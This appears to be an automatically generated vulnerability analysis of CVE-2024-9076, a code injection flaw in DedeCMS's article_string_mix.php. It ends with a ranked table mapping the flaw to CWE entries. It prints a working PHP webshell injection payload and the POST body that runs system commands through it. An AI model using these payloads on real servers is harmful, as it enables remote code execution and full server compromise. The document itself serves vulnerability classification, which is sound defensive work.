## Vulnerability Description
A vulnerability was found in DedeCMS up to 5.7.115. It has been rated as critical. This issue affects some unknown processing of the file article_string_mix.php. The manipulation leads to **os command injection**. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### Vulnerability Description Key Phrases
- **weakness:** **os command injection**
- **product:** DedeCMS
- **version:** up to 5.7.115
- **component:** article_string_mix.php

## CVE Reference Links Content Summary
Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2024-9076

**Root Cause:** The vulnerability lies in the `article_string_mix.php` file of DedeCMS V5.7.115. The validation rules applied to user input can be bypassed, which allows attackers to inject malicious PHP code.

**Weaknesses/Vulnerabilities:**
*   **Insufficient Input Validation:** The primary weakness is the inadequate validation of user-provided input within `article_string_mix.php`. This allows the attacker to inject arbitrary PHP code by bypassing the intended filtering mechanisms.
*   **Remote Code Execution (RCE):**  Due to the bypassed validation, the injected code is written into a file named `downmix.data.php`, located in the `/data/` directory. This file is then directly accessible and the attacker can execute the injected PHP code by accessing it.

**Impact of Exploitation:**
*   **Remote Code Execution:** Successful exploitation allows an attacker to execute arbitrary code on the server hosting the vulnerable DedeCMS instance. This includes system commands.
*   **Full System Compromise:** With remote code execution, an attacker could potentially gain full control of the server, leading to data breaches, malware installation, and denial of service, amongst other malicious activities.

**Attack Vectors:**
*   **HTTP POST Request:** The attack involves sending a crafted POST request to the `article_string_mix.php` file. This request includes the malicious PHP payload within the `allsource` parameter.
*   **Direct File Access:**  The attacker executes the injected code by sending a HTTP request to the `/data/downmix.data.php` file, passing the system command to execute via POST request.

**Required Attacker Capabilities/Position:**
*   **Network Access:** The attacker needs network access to the target server hosting the vulnerable DedeCMS installation.
*   **DedeCMS User Account:** The attacker must have a user account with privileges that allow them to access and manipulate the `article_string_mix.php` file. The provided exploit seems to work with an administrator account (DedeUserID=1).
*   **Understanding of DedeCMS Structure:** The attacker needs to understand where the `article_string_mix.php` is located, how to pass data to it, and where the data is written (the location of `downmix.data.php`).

**Technical Details:**
*   The vulnerability is triggered by crafting a specific POST request to `article_string_mix.php` with a malicious payload in the `allsource` parameter. This bypasses validation and writes the payload into `downmix.data.php`
* The attacker then sends a POST request to `downmix.data.php` to execute the injected code.
*   The provided payload leverages PHP's dynamic variable feature, using `$_POST` to execute system commands specified in the POST body.

**Example Payloads:**
*   **Injection Payload (sent to article\_string\_mix.php):**
    ```
    <?php
    //----------------------------
    //以下为手工指定的混淆串
    //----------------------------
    #start#
    #，织梦好，好织梦
    #，本文来自织梦
    #，织梦内容管理系统
    #，dedecms.com
    #，copyright dedecms
    #，内容来自dedecms
    #end#
    $cmd = '_POST';
    ${$cmd}[1](${$cmd}[0]);
    ?>
    ```
*   **Execution Payload (sent to downmix.data.php):**
    ```
    1=system&0=ipconfig
    ```
**Additional Notes:**
*   The `article_string_mix.php` is intended to mix strings for article content, likely for obfuscation or data manipulation purposes. The weakness is that the mixing process doesn't properly sanitize the input which then allows for PHP injection.
*   The provided exploit uses a technique of writing PHP code to a data file and then executing it through a direct request.
*   The referenced gitee link includes example requests, making it easy to replicate the exploit.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | alternate_terms | 1.000 |
| 2 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | alternate_terms | 0.800 |
| 3 | 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | Base | Allowed | sparse | 0.467 |
| 4 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | sparse | 0.434 |
| 5 | 1336 | Improper Neutralization of Special Elements Used in a Template Engine | Base | Allowed | sparse | 0.388 |
| 6 | 117 | Improper Output Neutralization for Logs | Base | Allowed | sparse | 0.382 |
| 7 | 99 | Improper Control of Resource Identifiers ('Resource Injection') | Class | Allowed-with-Review | sparse | 0.366 |
| 8 | 434 | Unrestricted Upload of File with Dangerous Type | Base | Allowed | sparse | 0.357 |
| 9 | 96 | Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection') | Base | Allowed | dense | 0.660 |
| 10 | 73 | External Control of File Name or Path | Base | Allowed | graph | 0.002 |



# Complete CWE Specifications

CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

CWE-117: Improper Output Neutralization for Logs

CWE-99: Improper Control of Resource Identifiers ('Resource Injection')

CWE-434: Unrestricted Upload of File with Dangerous Type

CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')

CWE-73: External Control of File Name or Path